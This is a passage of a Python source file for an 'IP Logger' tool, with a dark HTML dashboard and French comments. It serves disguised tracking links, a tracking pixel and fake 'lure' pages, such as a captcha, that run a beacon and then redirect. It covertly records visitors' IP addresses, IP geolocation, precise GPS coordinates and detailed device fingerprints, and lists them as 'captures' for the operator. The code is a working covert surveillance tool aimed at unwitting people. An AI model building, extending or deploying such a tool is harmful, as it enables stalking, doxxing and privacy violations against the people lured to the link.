.c-n{color:var(--muted);font-size:11px;font-weight:700;width:36px}
.c-isp{color:#c084fc;font-size:12px}
.c-path{color:#38bdf8;font-size:11px;font-family:monospace}
.c-loc{font-size:12px}
.c-geo{color:var(--green);font-size:11px;font-family:monospace}
.c-hw{color:#fbbf24;font-size:11px}

/* ── Badges ── */
.badge{display:inline-flex;align-items:center;padding:2px 7px;border-radius:4px;font-size:11px;font-weight:600;white-space:nowrap}
.b-mob{background:rgba(59,130,246,.1);color:#60a5fa;border:1px solid rgba(59,130,246,.2)}
.b-dsk{background:rgba(34,197,94,.08);color:#4ade80;border:1px solid rgba(34,197,94,.15)}
.b-cc{background:rgba(239,68,68,.08);color:#fca5a5;border:1px solid rgba(239,68,68,.15);font-size:10px}
.b-geo{background:rgba(34,197,94,.1);color:#4ade80;border:1px solid rgba(34,197,94,.2);font-size:10px}

/* ── Empty ── */
.empty{text-align:center;padding:70px 20px;color:var(--muted)}
.empty svg{opacity:.15;margin-bottom:12px}
.empty-t{font-size:14px;font-weight:500;color:var(--muted2);margin-bottom:4px}
.empty-s{font-size:12px}

/* ── Detail card (modal) ── */
.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:500;display:none;align-items:center;justify-content:center;padding:16px}
.modal-bg.open{display:flex}
.modal{background:#111;border:1px solid rgba(239,68,68,.2);border-radius:16px;width:100%;max-width:680px;max-height:85vh;overflow-y:auto;padding:24px}
.modal-title{font-size:15px;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:8px}
.modal-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.mf{background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.05);border-radius:8px;padding:10px 14px}
.mf-label{font-size:10px;text-transform:uppercase;letter-spacing:.6px;color:var(--muted);font-weight:600;margin-bottom:4px}
.mf-val{font-size:13px;color:var(--text);word-break:break-all}
.mf-val.mono{font-family:monospace;color:#fb923c;font-size:12px}
.mf-val.green{color:#4ade80}
.mf-val.red{color:#f87171}

/* ── Stats section ── */
.stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px;margin-top:16px}
.stat-block{background:rgba(0,0,0,.35);border:1px solid var(--border);border-radius:12px;padding:18px;backdrop-filter:blur(8px)}
.stat-block-title{font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--muted);margin-bottom:12px}
.bar-row{display:flex;align-items:center;gap:8px;margin-bottom:8px}
.bar-label{font-size:12px;color:var(--muted2);width:100px;flex-shrink:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.bar-track{flex:1;background:rgba(255,255,255,.05);border-radius:3px;height:5px;overflow:hidden}
.bar-fill{height:100%;background:linear-gradient(90deg,var(--red),#f87171);border-radius:3px;transition:width .4s ease}
.bar-count{font-size:11px;color:var(--muted);width:30px;text-align:right;flex-shrink:0}
</style>
</head>
<body>

<!-- App -->
<div class="app" id="app" style="flex-direction:column">

<nav>
  <div class="nav-brand">
    <div class="nav-dot"></div>
    <div class="nav-title">IP <span>Logger</span></div>
  </div>
  <div class="nav-tabs">
    <button class="nav-tab active" onclick="tab('captures')">{d_tab_captures}</button>
    <button class="nav-tab" onclick="tab('stats')">{d_tab_stats}</button>
    <button class="nav-tab" onclick="tab('config')">{d_tab_config}</button>
  </div>
  <div class="nav-right">
    <div class="status-badge"><div class="status-dot"></div> Live</div>
    <button class="btn btn-outline" onclick="location.reload()" style="padding:5px 10px;font-size:11px">{d_refresh}</button>
  </div>
</nav>

<div class="main">

<!-- CAPTURES -->
<div class="section active" id="sec-captures">
  <div class="ph">
    <div><div class="ph-title">{d_tab_captures}</div><div class="ph-sub">{count} {d_records} &bull; {now}</div></div>
    <div class="ph-actions">
      <button class="btn btn-red" onclick="clearLogs()">{d_clear}</button>
      <a class="btn btn-outline" href="/logs/json" target="_blank">{d_export}</a>
    </div>
  </div>

  <div class="stats">
    <div class="sc sc-red"><div class="sc-label">{d_visits}</div><div class="sc-val">{count}</div><div class="sc-sub">{d_total}</div></div>
    <div class="sc sc-white"><div class="sc-label">{d_unique_ips}</div><div class="sc-val">{unique_ips}</div><div class="sc-sub">{d_visitors}</div></div>
    <div class="sc sc-green"><div class="sc-label">{d_countries}</div><div class="sc-val">{unique_countries}</div><div class="sc-sub">{d_locations}</div></div>
    <div class="sc sc-yellow"><div class="sc-label">{d_mobile}</div><div class="sc-val">{mobile_pct}%</div><div class="sc-sub">{d_of_devices}</div></div>
    <div class="sc sc-blue"><div class="sc-label">{d_top_country}</div><div class="sc-val" style="font-size:20px;margin-top:4px">{top_country}</div><div class="sc-sub">{d_most_freq}</div></div>
    <div class="sc sc-green"><div class="sc-label">{d_gps}</div><div class="sc-val">{geo_count}</div><div class="sc-sub">{d_precise}</div></div>
  </div>

  <div class="toolbar">
    <input class="search" id="search" type="text" placeholder="{d_search_ph}" oninput="filterTable(this.value)">
    <button class="btn" onclick="copyRows()">{d_copy}</button>
  </div>

  <div class="tbl-wrap">
  <div class="tbl-scroll">
  <table id="tbl">
  <thead><tr>
    <th>#</th><th>{d_th_date}</th><th>IP</th><th>{d_th_country}</th><th>{d_th_city}</th>
    <th>ISP</th><th>GPS</th><th>{d_th_browser}</th><th>OS</th><th>{d_th_device}</th>
    <th>{d_th_screen}</th><th>RAM/CPU</th><th>{d_th_battery}</th><th>{d_th_conn}</th>
    <th>Timezone</th><th>{d_th_lang}</th><th>WebGL</th><th>Referer</th><th>+</th>
  </tr></thead>
  <tbody>{rows}</tbody>
  </table>
  </div>
  </div>
</div>

<!-- STATS -->
<div class="section" id="sec-stats">
  <div class="ph"><div><div class="ph-title">{d_tab_stats}</div><div class="ph-sub">{d_stats_sub}</div></div></div>
  <div class="stat-grid">
    <div class="stat-block"><div class="stat-block-title">{d_top_country}</div>{bar_country}</div>
    <div class="stat-block"><div class="stat-block-title">{d_browsers}</div>{bar_browser}</div>
    <div class="stat-block"><div class="stat-block-title">{d_os}</div>{bar_os}</div>
    <div class="stat-block"><div class="stat-block-title">{d_devices}</div>{bar_device}</div>
  </div>
</div>

<!-- CONFIG -->
<div class="section" id="sec-config">
  <div class="ph"><div><div class="ph-title">{d_tab_config}</div><div class="ph-sub">{d_config_sub}</div></div></div>
  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;max-width:700px">
    <div class="mf"><div class="mf-label">Track URL</div><div class="mf-val mono" id="cf-track">{track_url}</div></div>
    <div class="mf"><div class="mf-label">Pixel URL</div><div class="mf-val mono" id="cf-pixel">{pixel_url}</div></div>
    <div class="mf"><div class="mf-label">{d_active_lure}</div><div class="mf-val green">{lure}</div></div>
    <div class="mf"><div class="mf-label">{d_redirect_to}</div><div class="mf-val mono">{redirect}</div></div>
    <div class="mf" style="grid-column:1/-1"><div class="mf-label">{d_log_file}</div><div class="mf-val mono" style="color:var(--muted2)">{log_file}</div></div>
  </div>
  <div style="margin-top:16px;display:flex;gap:10px;flex-wrap:wrap">
    <button class="btn btn-outline" onclick="copy(document.getElementById('cf-track').textContent)">{d_copy} Track URL</button>
    <button class="btn btn-outline" onclick="copy(document.getElementById('cf-pixel').textContent)">{d_copy} Pixel URL</button>
  </div>
</div>

</div><!-- /main -->
</div><!-- /app -->

<!-- Modal -->
<div class="modal-bg" id="modal" onclick="if(event.target===this)closeModal()">
  <div class="modal">
    <div class="modal-title" style="color:var(--red)">&#x25CF; {d_detail}</div>
    <div class="modal-grid" id="modal-body"></div>
    <div style="margin-top:16px;text-align:right"><button class="btn btn-red" onclick="closeModal()">{d_close}</button></div>
  </div>
</div>

<script>
var ENTRIES = {entries_json};
var _i18n = {
  wrong_pass: "{d_wrong_pass}",
  confirm_clear: "{d_confirm_clear}"
};

// ── Tabs ──
function tab(id){
  document.querySelectorAll('.section').forEach(function(s){s.classList.remove('active')});
  document.getElementById('sec-'+id).classList.add('active');
  document.querySelectorAll('.nav-tab').forEach(function(t,i){
    t.classList.toggle('active',['captures','stats','config'][i]===id);
  });
}

// ── Filter ──
function filterTable(q){
  q=q.toLowerCase();
  document.querySelectorAll('#tbl tbody tr').forEach(function(r){
    r.style.display=r.textContent.toLowerCase().includes(q)?'':'none';
  });
}

// ── Clear ──
function clearLogs(){
  if(!confirm(_i18n.confirm_clear)) return;
  fetch('/clear',{method:'POST'}).then(function(){location.reload()});
}

// ── Copy ──
function copy(t){navigator.clipboard.writeText(t).catch(function(){})}
function copyRows(){
  var rows=Array.from(document.querySelectorAll('#tbl tbody tr')).filter(function(r){return r.style.display!=='none'});
  copy(rows.map(function(r){return Array.from(r.querySelectorAll('td')).slice(0,-1).map(function(c){return c.textContent.trim()}).join('\t')}).join('\n'));
}

// ── Modal ──
function openModal(idx){
  var e=ENTRIES[idx];if(!e)return;
  var fields=[
    ['IP',e.ip||'—','mono'],['Timestamp',e.timestamp||'—',''],
    ['Pays',e.country||'—',''],['Région',e.region||'—',''],
    ['Ville',e.city||'—',''],['ISP',e.isp||e.org||'—',''],
    ['AS',e.as||'—',''],['Coords IP',(e.lat&&e.lon)?e.lat+', '+e.lon:'—',''],
    ['GPS précis',(e.geo_lat&&e.geo_lon)?e.geo_lat+', '+e.geo_lon+' (±'+e.geo_acc+')':(e.geo_lat||'—'),'green'],
    ['Navigateur',e.browser||'—',''],['OS',e.os||'—',''],
    ['Appareil',e.device||'—',''],['Plateforme',e.platform||'—',''],
    ['Vendor',e.vendor||'—',''],['Écran',e.screen||'—',''],
    ['Dispo',e.avail||'—',''],['DPR',e.dpr||'—',''],
    ['RAM',e.memory||'—',''],['CPU',e.cores||'—',''],
    ['Batterie',e.battery||'—',''],['Connexion',e.connection||'—',''],
    ['WebGL',e.webgl||'—',''],['Plugins',e.plugins||'—',''],
    ['Langue',e.lang||'—',''],['Touch',e.touch||'—',''],
    ['Cookies',e.cookies||'—',''],['Do Not Track',e.doNotTrack||'—',''],
    ['Timezone',e.timezone||'—',''],['Referer',e.referer||'—',''],
    ['User-Agent',e.user_agent||'—',''],['Path',e.path||'—',''],
  ];
  var html='';
  fields.forEach(function(f){
    html+='<div class="mf"><div class="mf-label">'+f[0]+'</div><div class="mf-val'+(f[2]?' '+f[2]:'')+'">'+escHtml(String(f[1]))+'</div></div>';
  });
  document.getElementById('modal-body').innerHTML=html;
  document.getElementById('modal').classList.add('open');
}
function closeModal(){document.getElementById('modal').classList.remove('open')}
function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
</script>
</body></html>"""

# ═══ UA Parser ════════════════════════════════════════════

def parse_ua(ua):
    browser = "Unknown"
    for pat, name in [
        (r"Edg[eA/]", "Edge"), (r"OPR/", "Opera"), (r"SamsungBrowser", "Samsung"),
        (r"YaBrowser", "Yandex"), (r"UCBrowser", "UCBrowser"),
    ]:
        if re.search(pat, ua):
            browser = name; break
    else:
        if "Chrome/" in ua:
            m = re.search(r"Chrome/(\d+)", ua)
            browser = f"Chrome {m.group(1)}" if m else "Chrome"
        elif "Firefox/" in ua:
            m = re.search(r"Firefox/(\d+)", ua)
            browser = f"Firefox {m.group(1)}" if m else "Firefox"
        elif "Safari/" in ua and "Chrome" not in ua:
            browser = "Safari"
        elif "curl" in ua: browser = "curl"
        elif "python" in ua.lower(): browser = "Python/requests"

    os_name = "Unknown"
    for pat, name in [
        ("Windows NT 10.0", "Windows 10/11"), ("Windows NT 6.3", "Windows 8.1"),
        ("Windows NT 6.1", "Windows 7"), ("Windows", "Windows"),
        ("CrOS", "ChromeOS"), ("iPad", "iPadOS"), ("iPhone", "iOS"),
        ("Mac OS X", "macOS"), ("Android", "Android"), ("Linux", "Linux"),
    ]:
        if pat in ua:
            if pat == "Android":
                m = re.search(r"Android ([\d.]+)", ua)
                os_name = f"Android {m.group(1)}" if m else "Android"
            elif pat == "iPhone":
                m = re.search(r"iPhone OS ([\d_]+)", ua)
                os_name = f"iOS {m.group(1).replace('_','.')}" if m else "iOS"
            else:
                os_name = name
            break

    mobile = bool(re.search(r"Mobile|Android|iPhone|iPad", ua))
    return browser, os_name, "Mobile" if mobile else "Desktop"

# ═══ GeoIP (ip-api primary, ipinfo fallback) ══════════════

def enrich_ip(ip, entry):
    if LOCAL_RE.match(ip):
        return
    geo = _geoip_ipapi(ip) or _geoip_freeipapi(ip) or _geoip_ipinfo(ip)
    if geo:
        entry.update(geo)
        _save_entry(entry)
        city = geo.get("city","?"); country = geo.get("country","?")
        isp  = geo.get("isp","?")
        print(f"  └─ {city}, {country} — {isp}")


def _req(url, timeout=5):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read())


def _geoip_ipapi(ip):
    try:
        d = _req(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,district,zip,isp,org,as,lat,lon,mobile,proxy,hosting")
        if d.get("status") != "success": return None
        return {
            "country": d.get("country",""), "country_code": d.get("countryCode",""),
            "region":  d.get("regionName",""), "city": d.get("city",""),
            "district":d.get("district",""), "zip": d.get("zip",""),
            "isp":     d.get("isp",""), "org": d.get("org",""),
            "as":      d.get("as",""), "lat": d.get("lat",""), "lon": d.get("lon",""),
            "mobile":  str(d.get("mobile","")), "proxy": str(d.get("proxy","")),
            "hosting": str(d.get("hosting","")),
        }
    except Exception: return None


def _geoip_freeipapi(ip):
    # freeipapi.com — gratuit, pas de clé, ~60 req/min
    try:
        d = _req(f"https://freeipapi.com/api/json/{ip}")
        if not d.get("cityName"): return None
        return {
            "country": d.get("countryName",""), "country_code": d.get("countryCode",""),
            "region":  d.get("regionName",""),  "city": d.get("cityName",""),
            "district":"", "zip": d.get("zipCode",""),
            "isp": "", "org": "", "as": "",
            "lat": str(d.get("latitude","")), "lon": str(d.get("longitude","")),
            "mobile": "", "proxy": "", "hosting": "",
        }
    except Exception: return None


def _geoip_ipinfo(ip):
    try:
        d = _req(f"https://ipinfo.io/{ip}/json")
        loc = d.get("loc","").split(",")
        return {
            "country": d.get("country",""), "country_code": d.get("country",""),
            "region":  d.get("region",""),  "city": d.get("city",""),
            "district":"", "zip": d.get("postal",""),
            "isp":     d.get("org",""),      "org": d.get("org",""), "as": "",
            "lat": loc[0] if len(loc)==2 else "", "lon": loc[1] if len(loc)==2 else "",
            "mobile": "", "proxy": "", "hosting": "",
        }
    except Exception: return None


def _save_entry(entry):
    lf = CONFIG["log_file"]
    if not os.path.exists(lf):
        return
    try:
        with open(lf, "r", encoding="utf-8") as f:
            logs = json.load(f)
        for i, e in enumerate(logs):
            if e.get("timestamp") == entry.get("timestamp"):
                logs[i] = entry; break
        with open(lf, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=2, ensure_ascii=False)
    except Exception:
        pass


def handle_beacon(ip, data):
    lf = CONFIG["log_file"]
    if not os.path.exists(lf):
        return
    try:
        with open(lf, "r", encoding="utf-8") as f:
            logs = json.load(f)
        for i in range(len(logs)-1, -1, -1):
            if logs[i].get("ip") == ip:
                logs[i].update({k: v for k, v in data.items() if v})
                break
        with open(lf, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=2, ensure_ascii=False)
    except Exception:
        pass

# ═══ Core logging ═════════════════════════════════════════

def get_real_ip(handler):
    for h in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP", "True-Client-IP"):
        v = handler.headers.get(h)
        if v:
            ip = v.split(",")[0].strip()
            if ip and not LOCAL_RE.match(ip):
                return ip
    return handler.client_address[0]


def log_entry(ip, handler):
    ua = handler.headers.get("User-Agent", "")
    browser, os_name, device = parse_ua(ua)
    entry = {
        "timestamp":    datetime.now(timezone.utc).isoformat(),
        "ip":           ip,
        "country": "", "country_code": "", "region": "", "city": "",
        "isp": "", "org": "", "as": "", "lat": "", "lon": "",
        "browser":      browser,
        "os":           os_name,
        "device":       device,
        "screen": "", "avail": "", "dpr": "", "timezone": "", "platform": "",
        "vendor": "", "lang": "", "langs": "", "touch": "", "touchpoints": "",
        "memory": "", "cores": "", "connection": "", "downlink": "",
        "plugins": "", "webgl": "", "canvas": "", "cookies": "", "battery": "",
        "geo_lat": "", "geo_lon": "", "geo_acc": "",
        "method":       handler.command,
        "path":         handler.path,
        "user_agent":   ua,
        "referer":      handler.headers.get("Referer", ""),
        "accept_lang":  handler.headers.get("Accept-Language", ""),
        "cf_ray":       handler.headers.get("CF-Ray", ""),
        "raw_ip":       handler.client_address[0],
    }
    lf = CONFIG["log_file"]
    logs = []
    if os.path.exists(lf):
        try:
            with open(lf, "r", encoding="utf-8") as f:
                logs = json.load(f)
        except Exception:
            pass
    logs.append(entry)
    try:
        with open(lf, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=2, ensure_ascii=False)
    except Exception as exc:
        print(f"[!] log write: {exc}")
    print(f"  [{entry['timestamp'][11:19]}] {ip:>15}  {browser} / {os_name} / {device}")
    threading.Thread(target=enrich_ip, args=(ip, entry), daemon=True).start()
    return entry

# ═══ HTTP Handler ══════════════════════════════════════════

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_GET(self):
        try:
            raw   = self.path
            path  = raw.split("?")[0].rstrip("/") or "/"
            qs    = self._qs()
            ip    = get_real_ip(self)
            token = CONFIG["track_token"]

            # ── Dashboard (Basic Auth) ─────────────────
            if path in ("/logs", "/logs/json", "/dashboard"):
                if CONFIG["secret"] and not self._check_auth():
                    self.send_response(401)
                    self.send_header("WWW-Authenticate", 'Basic realm="IP Logger"')
                    self.send_header("Content-Length", "0")
                    self.end_headers(); return
                self._serve_dashboard(raw_json=(path == "/logs/json")); return

            # ── Pixel ──────────────────────────────────
            if path in ("/pixel", f"/pixel/{token}"):
                log_entry(ip, self)
                self._gif(); return

            # ── Redirect 302 direct (mode redirect) ────
            if path in ("/r", f"/r/{token}"):
                log_entry(ip, self)
                target = qs.get("to", CONFIG["redirect"])
                self.send_response(302)
                self.send_header("Location", target)
                self.end_headers(); return

            # ── Track URL principale ───────────────────
            if path in (f"/t/{token}", f"/v/{token}", f"/s/{token}", f"/go/{token}", "/"):
                log_entry(ip, self)
                if CONFIG["mode"] == "redirect":
                    # 302 immédiat + pixel en fond via img tag
                    page = (
                        f'<!DOCTYPE html><html><head><meta charset=UTF-8>'
                        f'<meta http-equiv="refresh" content="0;url={CONFIG["redirect"]}">'
                        f'</head><body>'
                        f'{BEACON_JS}'
                        f'<script>window._doRedirect=function(){{window.location.replace("{CONFIG["redirect"]}")}}</script>'
                        f'</body></html>'
                    )
                    self._raw(200, page.encode(), "text/html; charset=utf-8")
                else:
                    self._serve_lure()
                return

            self._raw(404, b"Not Found", "text/plain")
        except (BrokenPipeError, ConnectionResetError): pass
        except Exception as e: print(f"[!] GET {e}")

    def do_POST(self):
        try:
            path = self.path.split("?")[0].rstrip("/")
            ip   = get_real_ip(self)

            if path == "/beacon":
                n   = int(self.headers.get("Content-Length", 0))
                raw = self.rfile.read(min(n, 8192))
                try:
                    data = json.loads(raw)
                    threading.Thread(target=handle_beacon, args=(ip, data), daemon=True).start()
                except Exception: pass
                self._raw(200, b'{"ok":1}', "application/json"); return

            if path == "/clear":
                with open(CONFIG["log_file"], "w", encoding="utf-8") as f:
                    json.dump([], f)
                self._raw(200, b'{"ok":1}', "application/json"); return

            self._raw(200, b'{"ok":1}', "application/json")
        except (BrokenPipeError, ConnectionResetError): pass
        except Exception as e: print(f"[!] POST {e}")

    def do_HEAD(self):
        try:
            log_entry(get_real_ip(self), self)
            self.send_response(200)
            self.send_header("Content-Type","text/html")
            self.end_headers()
        except Exception: pass

    # ── Helpers ──────────────────────────────────────────
    def _qs(self):
        if "?" not in self.path: return {}
        return {k: urllib.parse.unquote_plus(v)
                for k,v in (p.split("=",1) for p in self.path.split("?",1)[1].split("&") if "=" in p)}

    def _raw(self, status, body, ctype):
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _gif(self):
        self.send_response(200)
        self.send_header("Content-Type","image/gif")
        self.send_header("Content-Length", str(len(PIXEL_GIF)))
        self.send_header("Cache-Control","no-store")
        self.end_headers()
        self.wfile.write(PIXEL_GIF)

    def _check_auth(self):
        auth = self.headers.get("Authorization", "")
        if not auth.startswith("Basic "): return False
        try:
            decoded = base64.b64decode(auth[6:]).decode()
            _, pwd  = decoded.split(":", 1)
            return pwd == CONFIG["secret"]
        except Exception:
            return False

    def _serve_lure(self):
        import random, string
        ray = "".join(random.choices(string.ascii_lowercase+string.digits, k=16))
        ts  = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        redir = CONFIG["redirect"]
        # Script qui déclenche le redirect APRÈS que le beacon ait envoyé ses données
        redir_script = (
            f'<script>'
            f'window._doRedirect=function(){{window.location.replace("{redir}")}};'
            f'</script>'
        )
        fn   = LURES.get(CONFIG["lure"], _lure_captcha)
        html = (fn()
            .replace("{beacon}",   BEACON_JS + redir_script)
            .replace("{ray}",      ray)
            .replace("{ts}",       ts)
            .replace("{redirect}", redir)
        )
        self._raw(200, html.encode(), "text/html; charset=utf-8")

    def _serve_dashboard(self, raw_json=False):
        from collections import Counter
        lf   = CONFIG["log_file"]
        logs = []
        if os.path.exists(lf):
            try:
                with open(lf, "r", encoding="utf-8") as f:
                    logs = json.load(f)
            except Exception: pass

        if raw_json:
            self._raw(200, json.dumps(logs, indent=2, ensure_ascii=False).encode(), "application/json"); return

        rev = list(reversed(logs))

        unique_ips       = len({e.get("ip","") for e in logs})
        unique_countries = len({e.get("country","") for e in logs if e.get("country")})
        mobile_count     = sum(1 for e in logs if e.get("device")=="Mobile")
        mobile_pct       = round(mobile_count*100/len(logs)) if logs else 0
        geo_count        = sum(1 for e in logs if e.get("geo_lat"))
        country_ctr      = Counter(e.get("country","") for e in logs if e.get("country"))
        top_country      = country_ctr.most_common(1)[0][0] if country_ctr else "—"

        token     = CONFIG["track_token"]
        port      = CONFIG["port"]
        base      = CONFIG.get("public_url") or f"http://localhost:{port}"
        track_url = f"{base}/t/{token}"
        pixel_url = f"{base}/pixel/{token}"

        def _bars(ctr, n=8):
            top  = ctr.most_common(n)
            total = sum(ctr.values()) or 1
            html = ""
            for label, cnt in top:
                pct = round(cnt * 100 / total)
                html += (f'<div class="bar-row">'
                         f'<div class="bar-label" title="{label}">{label or "?"}</div>'
                         f'<div class="bar-track"><div class="bar-fill" style="width:{pct}%"></div></div>'
                         f'<div class="bar-count">{cnt}</div></div>')
            return html or '<div style="color:var(--muted);font-size:12px">Pas de données</div>'

        bar_country = _bars(country_ctr)
        bar_browser = _bars(Counter(e.get("browser","?") for e in logs if e.get("browser")))
        bar_os      = _bars(Counter(e.get("os","?") for e in logs if e.get("os")))
        bar_device  = _bars(Counter(e.get("device","?") for e in logs))

        rows = ""
        for i, e in enumerate(rev, 1):
            ip  = e.get("ip","")
            ip_d = "—" if LOCAL_RE.match(ip) else ip
            dev  = e.get("device","?")
            bc   = "b-mob" if dev=="Mobile" else "b-dsk"
            cc   = e.get("country","")
            cc_b = f'<span class="badge b-cc">{cc}</span>' if cc else "—"
            gps  = ""
            if e.get("geo_lat"):
                gps = f'<span class="badge b-geo">GPS ±{e.get("geo_acc","?")}</span>'
            elif e.get("lat"):
                gps = f'<span class="c-geo" style="font-size:11px">{e["lat"]:.4f},{e["lon"]:.4f}</span>' if isinstance(e.get("lat"),float) else f'<span class="c-geo" style="font-size:11px">{e["lat"]},{e["lon"]}</span>'
            isp  = (e.get("isp","") or e.get("org",""))[:22]
            mc   = " ".join(filter(None,[e.get("memory",""),e.get("cores","")]))
            bat  = e.get("battery","")
            conn = e.get("connection","")
            wgl  = (e.get("webgl","") or "")[:20]
            ref  = (e.get("referer","") or "")[:24]
            ts   = e.get("timestamp","")[:19].replace("T"," ")
            city = e.get("city","")
            loc  = city[:18] or "—"
            tz   = e.get("timezone","")
            tz_s = tz.split("/")[-1] if "/" in tz else tz
            lang = e.get("lang","")

            idx = len(rev) - i  # index dans rev pour le modal (rev[idx] = e)
            rows += (
                f'<tr onclick="openModal({idx})">'
                f'<td class="c-n">{i}</td>'
                f'<td class="c-ts">{ts}</td>'
                f'<td class="c-ip">{ip_d}</td>'
                f'<td>{cc_b}</td>'
                f'<td class="c-loc">{loc}</td>'
                f'<td class="c-isp">{isp or "—"}</td>'
                f'<td>{gps or "—"}</td>'
                f'<td>{e.get("browser","—")}</td>'
                f'<td>{e.get("os","—")}</td>'
                f'<td><span class="badge {bc}">{dev}</span></td>'
                f'<td>{e.get("screen","") or "—"}</td>'
                f'<td class="c-hw">{mc or "—"}</td>'
                f'<td>{bat or "—"}</td>'
                f'<td>{conn or "—"}</td>'
                f'<td>{tz_s or "—"}</td>'
                f'<td>{lang or "—"}</td>'
                f'<td style="font-size:10px;color:var(--muted)">{wgl or "—"}</td>'
                f'<td style="font-size:11px;color:var(--muted)">{ref or "—"}</td>'
                f'<td style="color:var(--red);cursor:pointer">›</td>'
                f'</tr>'
            )

        if not rows:
            rows = ('<tr><td colspan="19"><div class="empty">'
                    '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>'
                    '<div class="empty-t">Aucune capture</div>'
                    '<div class="empty-s">En attente de connexions...</div>'
                    '</div></td></tr>')

        entries_json_str = json.dumps(rev, ensure_ascii=False)
        now  = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

        # Dashboard i18n strings (per-language)
        D = {
            "en": {
                "tab_captures":"Captures","tab_stats":"Stats","tab_config":"Config",
                "refresh":"Refresh","records":"record(s)","clear":"Clear",
                "export":"Export JSON","visits":"Visits","total":"total",
                "unique_ips":"Unique IPs","visitors":"visitors","countries":"Countries",
                "locations":"locations","mobile":"Mobile","of_devices":"of devices",
                "top_country":"Top country","most_freq":"most frequent",
                "gps":"GPS","precise":"precise","search_ph":"Search IP, country, city, ISP...",
                "copy":"Copy","th_date":"Date UTC","th_country":"Country","th_city":"City",
                "th_browser":"Browser","th_device":"Device","th_screen":"Screen",
                "th_battery":"Battery","th_conn":"Connection","th_lang":"Language",
                "stats_sub":"Analysis of collected data","browsers":"Browsers",
                "os":"Operating Systems","devices":"Devices",
                "config_sub":"Active URLs and settings","active_lure":"Active lure",
                "redirect_to":"Redirect to","log_file":"Log file",
                "detail":"Capture detail","close":"Close",
                "wrong_pass":"Wrong password","confirm_clear":"Clear all logs?",
            },
            "fr": {
                "tab_captures":"Captures","tab_stats":"Stats","tab_config":"Config",
                "refresh":"Actualiser","records":"enregistrement(s)","clear":"Effacer",
                "export":"Export JSON","visits":"Visites","total":"total",
                "unique_ips":"IPs uniques","visitors":"visiteurs","countries":"Pays",
                "locations":"localisations","mobile":"Mobile","of_devices":"des appareils",
                "top_country":"Top pays","most_freq":"le plus fréquent",
                "gps":"GPS","precise":"précises","search_ph":"Rechercher IP, pays, ville, ISP...",
                "copy":"Copier","th_date":"Date UTC","th_country":"Pays","th_city":"Ville",
                "th_browser":"Navigateur","th_device":"Appareil","th_screen":"Écran",
                "th_battery":"Batterie","th_conn":"Connexion","th_lang":"Langue",
                "stats_sub":"Analyse des données collectées","browsers":"Navigateurs",
                "os":"Systèmes d'exploitation","devices":"Appareils",
                "config_sub":"URLs et paramètres actifs","active_lure":"Leurre actif",
                "redirect_to":"Redirect vers","log_file":"Fichier de log",
                "detail":"Détail capture","close":"Fermer",
                "wrong_pass":"Mot de passe incorrect","confirm_clear":"Effacer tous les logs ?",
            },
            "ru": {
                "tab_captures":"Захваты","tab_stats":"Статистика","tab_config":"Настройки",
                "refresh":"Обновить","records":"запись(и)","clear":"Очистить",
                "export":"Экспорт JSON","visits":"Визиты","total":"всего",
                "unique_ips":"Уникальные IP","visitors":"посетителей","countries":"Страны",
                "locations":"локации","mobile":"Мобильные","of_devices":"устройств",
                "top_country":"Топ страна","most_freq":"наиболее частая",
                "gps":"GPS","precise":"точных","search_ph":"Поиск IP, страна, город...",
                "copy":"Копировать","th_date":"Дата UTC","th_country":"Страна","th_city":"Город",
                "th_browser":"Браузер","th_device":"Устройство","th_screen":"Экран",
                "th_battery":"Батарея","th_conn":"Соединение","th_lang":"Язык",
                "stats_sub":"Анализ собранных данных","browsers":"Браузеры",
                "os":"Операционные системы","devices":"Устройства",
                "config_sub":"Активные URL и настройки","active_lure":"Активная ловушка",
                "redirect_to":"Редирект на","log_file":"Файл логов",
                "detail":"Детали захвата","close":"Закрыть",
                "wrong_pass":"Неверный пароль","confirm_clear":"Удалить все логи?",
            },
            "es": {
                "tab_captures":"Capturas","tab_stats":"Stats","tab_config":"Config",
                "refresh":"Actualizar","records":"registro(s)","clear":"Borrar",
                "export":"Exportar JSON","visits":"Visitas","total":"total",
                "unique_ips":"IPs únicas","visitors":"visitantes","countries":"Países",
                "locations":"ubicaciones","mobile":"Móvil","of_devices":"de dispositivos",
                "top_country":"Top país","most_freq":"más frecuente",
                "gps":"GPS","precise":"precisas","search_ph":"Buscar IP, país, ciudad...",
                "copy":"Copiar","th_date":"Fecha UTC","th_country":"País","th_city":"Ciudad",
                "th_browser":"Navegador","th_device":"Dispositivo","th_screen":"Pantalla",
                "th_battery":"Batería","th_conn":"Conexión","th_lang":"Idioma",
                "stats_sub":"Análisis de datos recopilados","browsers":"Navegadores",
                "os":"Sistemas operativos","devices":"Dispositivos",
                "config_sub":"URLs y parámetros activos","active_lure":"Señuelo activo",
                "redirect_to":"Redirigir a","log_file":"Archivo de log",
                "detail":"Detalle captura","close":"Cerrar",
                "wrong_pass":"Contraseña incorrecta","confirm_clear":"¿Borrar todos los registros?",
            },
            "de": {
                "tab_captures":"Erfassungen","tab_stats":"Statistik","tab_config":"Konfig",
